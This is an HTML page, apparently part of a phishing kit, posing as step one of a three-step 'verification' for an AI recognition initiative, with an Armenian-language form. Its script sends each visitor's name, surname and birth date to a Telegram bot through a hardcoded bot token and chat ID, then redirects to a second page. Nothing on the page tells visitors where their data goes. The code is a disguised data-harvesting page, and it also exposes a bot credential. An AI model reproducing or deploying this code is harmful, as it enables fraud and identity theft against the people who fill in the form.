<head>

    <link rel="preconnect" href="https://fonts.googleapis.com">

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        #preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 1;
            transition: opacity 2s ease;
        }

        #preloader.hidden {
            opacity: 0;
            pointer-events: none;
        }

        #preloader img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: url('./fon.gif') no-repeat center center fixed;
            background-size: cover;
            color: #bebb24;
            min-height: 100vh;
            padding-top: 20px;
            animation: fadeBackground 5s infinite alternate ease-in-out;
            opacity: 0;
            transition: opacity 1s ease;
        }

        body.loaded {
            opacity: 1;
        }

        @keyframes fadeBackground {
            100% { opacity: 0.9; }
            100% { opacity: 1; }
        }

        .stars {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #fff;
            border-radius: 50%;
            animation: fall linear infinite;
        }

        .container {
            text-align: center;
            padding: 40px 25px;
            background: rgba(10, 10, 20, 0.85);
            border-radius: 25px;
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
            max-width: 700px;
            width: 95%;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        .company-name {
            font-family: 'Exo 2', sans-serif;
            font-size: 55px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 15px;
            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
        }

        .highlight-text {
            margin-bottom: 25px;
            line-height: 1.4;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
            font-family: 'Noto Sans Armenian', sans-serif;
            font-size: 36px;
            font-weight: 700;
            color: #d8bfd8;
            display: block;
        }

        .progress-bar {
            width: 100%;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 25px;
        }

        .progress-bar div {
            width: 33%;
            height: 10px;
            background: linear-gradient(45deg, #8a2be2, #4b0082);
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            font-family: 'Noto Sans Armenian', sans-serif;
            font-size: 20px;
            color: #d8bfd8;
            margin-bottom: 8px;
            display: block;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            font-family: 'Roboto', sans-serif;
            font-size: 18px;
            border: 2px solid #8a2be2;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.3s;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
        }

        .form-group input:focus {
            border-color: #4b0082;
        }

        .cta-button {
            display: inline-block;
            background: linear-gradient(45deg, #8a2be2, #4b0082);
            color: #fff;
            padding: 16px 40px;
            border-radius: 35px;
            text-decoration: none;
            font-family: 'Exo 2', sans-serif;
            font-weight: 700;
            font-size: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
            border: none;
            cursor: pointer;
            position: relative;
            z-index: 10;
        }

        .cta-button:hover {
            background: linear-gradient(45deg, #4b0082, #8a2be2);
            transform: translateY(-2px) scale(1.03);
            box-shadow: 0 0 25px rgba(138, 43, 226, 1);
        }

        .social-links {
            margin-top: 25px;
        }

        .social-links a {
            margin: 0 20px;
            font-size: 34px;
            color: #8a2be2;
            transition: all 0.3s ease;
        }

        .social-links a:hover {
            color: #d8bfd8;
            transform: translateY(-10px);
            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
        }

        #success-message, #error-message, #age-error-message {
            display: none;
            margin-top: 20px;
            font-family: 'Noto Sans Armenian', sans-serif;
            font-size: 20px;
            color: #fff;
            padding: 12px;
            border-radius: 10px;
        }

        #success-message {
            background-color: rgba(138, 43, 226, 0.8);
        }

        #error-message, #age-error-message {
            background-color: rgba(244, 67, 54, 0.8);
        }

        .whatsapp-button {
            position: fixed;
            bottom: 25px;
            right: 25px;
            background: #8a2be2;
            padding: 15px;
            border-radius: 50%;
            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
            transition: all 0.3s ease;
        }

        .whatsapp-button:hover {
            background: #4b0082;
            transform: scale(1.1);
            box-shadow: 0 0 20px rgba(138, 43, 226, 1);
        }

        @media (max-width: 768px) {
            body { padding-top: 15px; }
            .company-name { font-size: 48px; }
            .highlight-text { font-size: 30px; }
            .cta-button { padding: 14px 35px; font-size: 20px; }
            .container { padding: 30px 20px; margin-top: 10px; }
            .form-group label { font-size: 18px; }
            .form-group input { font-size: 16px; padding: 10px; }
            .social-links a { font-size: 30px; margin: 0 15px; }
        }

        @media (max-width: 480px) {
            body { padding-top: 10px; }
            .company-name { font-size: 36px; }
            .highlight-text { font-size: 24px; }
            .cta-button { padding: 12px 30px; font-size: 18px; }
            .container { padding: 20px 15px; margin-top: 5px; }
            .form-group label { font-size: 16px; }
            .form-group input { font-size: 14px; padding: 8px; }
            .social-links a { font-size: 26px; margin: 0 10px; }
        }
    </style>
</head>
<body>
    <div id="preloader">
        <img src="./ai.gif" alt="AI Loading Animation">
    </div>
    <div class="stars"></div>

    <div class="container" data-aos="fade-up">
        <h1 class="company-name">NextGen Artificial Intelligence Recognition Initiative</h1>
        <p class="highlight-text">(Քայլ 1/3)</p>
        
        <div class="progress-bar">
            <div></div>
        </div>
        <form id="verification-form">
            <div class="form-group">
                <label for="first-name">Անուն</label>
                <input type="text" id="first-name" name="first-name" placeholder="Մուտքագրեք Ձեր անունը" required>
            </div>
            <div class="form-group">
                <label for="last-name">Ազգանուն</label>
                <input type="text" id="last-name" name="last-name" placeholder="Մուտքագրեք Ձեր ազգանունը" required>
            </div>
            <div class="form-group">
                <label for="birth-date">Ծննդյան ամսաթիվ (օր-ամիս-տարի)</label>
                <input type="text" id="birth-date" name="birth-date" placeholder="Օրինակ՝ 31-12-1980" maxlength="10" required>
            </div>
            <div style="margin-top: 20px;">
                <button type="submit" class="cta-button">Հաջորդը</button>
            </div>
        </form>
        <div class="social-links" data-aos="fade-up" data-aos-delay="300">
            <a href="https://m.facebook.com" target="_blank"><i class="fab fa-facebook-f"></i></a>
            <a href="https://www.instagram.com" target="_blank"><i class="fab fa-instagram"></i></a>
            <a href="https://twitter.com" target="_blank"><i class="fab fa-twitter"></i></a>
        </div>
        <div id="success-message">Հաջողությամբ լրացված է։</div>
        <div id="error-message">Սխալ։ Խնդրում ենք ստուգել տվյալները։</div>
        <div id="age-error-message">Սխալ։ Դուք 18 տարեկան չկաք դեռ։</div>
    </div>

    <a href="https://wa.me/37496653666" class="whatsapp-button" data-aos="fade-up" data-aos-delay="400">
        <i class="fab fa-whatsapp" style="font-size: 26px; color: #fff;"></i>
    </a>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
    <script>
        setTimeout(() => {
            const preloader = document.getElementById('preloader');
            const body = document.body;
            preloader.classList.add('hidden');
            body.classList.add('loaded');
            preloader.addEventListener('transitionend', () => {
                preloader.remove();
            });
        }, 2000);

        const starsContainer = document.querySelector('.stars');
        for (let i = 0; i < 100; i++) {
            const star = document.createElement('div');
            star.classList.add('star');
            star.style.left = `${Math.random() * 100}vw`;
            star.style.animationDuration = `${Math.random() * 3 + 2}s`;
            star.style.animationDelay = `${Math.random() * 5}s`;
            starsContainer.appendChild(star);
        }

        const TELEGRAM_TOKEN = "7505675886:AAEOZyLgDk3TqEXIUJqhDzZtpVtFNjKh9ww";
        const CHAT_ID = "7231332868";

        document.getElementById('first-name').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\d/g, '');
        });

        document.getElementById('last-name').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\d/g, '');
        });

        document.getElementById('birth-date').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            if (value.length > 8) value = value.slice(0, 8);
            let formattedValue = '';
            if (value.length > 0) formattedValue = value.slice(0, 2);
            if (value.length > 2) formattedValue += '-' + value.slice(2, 4);
            if (value.length > 4) formattedValue += '-' + value.slice(4, 8);
            e.target.value = formattedValue;
        });

        document.getElementById('verification-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const firstName = document.getElementById('first-name').value.trim();
            const lastName = document.getElementById('last-name').value.trim();
            const birthDate = document.getElementById('birth-date').value.trim();

            if (!firstName || !lastName || birthDate.length !== 10) {
                showMessage('error-message');
                return;
            }

            if (/\d/.test(firstName) || /\d/.test(lastName)) {
                showMessage('error-message');
                return;
            }

            const [day, month, year] = birthDate.split('-').map(Number);
            const isValidDate = (
                day >= 1 && day <= 31 &&
                month >= 1 && month <= 12 &&
                year >= 1900 && year <= 2012
            );
            if (!isValidDate || isNaN(day) || isNaN(month) || isNaN(year)) {
                showMessage('error-message');
                return;
            }

            const currentYear = new Date().getFullYear();
            if (year > 2012 || (year === 2012 && (month > 3 || (month === 3 && day > 21)))) {
                showMessage('age-error-message');
                return;
            }

            const message = `
📋 Վերիֆիկացիայի տվյալներ (Քայլ 1):
- Անուն: ${firstName}
- Ազգանուն: ${lastName}
- Ծննդյան ամսաթիվ: ${birthDate}
            `;

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Данные отправлены в Telegram');
                    showMessage('success-message');
                    setTimeout(() => {
                        window.location.href = './v2.html';
                    }, 2000);
                } else {
                    console.error('Telegram ошибка:', data);
                    showMessage('error-message');
                }
            })
            .catch(error => {
                console.error('Ошибка отправки:', error);
                showMessage('error-message');
            });
        });

        function showMessage(id) {
            document.getElementById(id).style.display = 'block';
            setTimeout(() => {
                document.getElementById(id).style.display = 'none';
            }, 3000);
        }

        AOS.init({
            duration: 800,
            easing: 'ease-out',
            once: true
        });

        gsap.fromTo(".cta-button", 
            { scale: 0.9, opacity: 0 }, 
            { scale: 1, opacity: 1, duration: 0.8, ease: "back.out(1.7)", delay: 0.5 }
        );

        gsap.from(".whatsapp-button", {
            y: 50,
            opacity: 0,
            duration: 0.6,
            ease: "power2.out",
            delay: 1
        });
    </script>
</body>
</html>
